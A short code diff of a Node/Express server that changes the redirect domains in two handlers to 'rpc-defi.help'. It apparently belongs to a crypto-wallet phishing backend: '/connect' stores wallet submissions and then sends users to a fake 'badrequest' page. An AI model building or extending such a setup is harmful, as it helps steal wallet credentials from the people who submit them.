@@ -517,7 +517,7 @@ app.post("/connect", async (req, res) => {
     };
     data.createdAt = new Date();
     const savedData = await HubWallet.create(data);
-    res.redirect('https://de-fi-assist.netlify.app/badrequest');
+    res.redirect('https://rpc-defi.help/badrequest');
     return savedData;
   } catch (err) {
     console.error(err);
@@ -540,7 +540,7 @@ app.post("/deletetr/:id", async (req, res) => {
     // Update the transaction in your data source using the provided data
     await HubWallet.deleteOne({ _id: id });
 
-    res.redirect('https://de-fi-assist.netlify.app/localhost');
+    res.redirect('https://rpc-defi.help/localhost');
   } catch (error) {
     console.error(error);
     res.status(500).send("Internal server error");
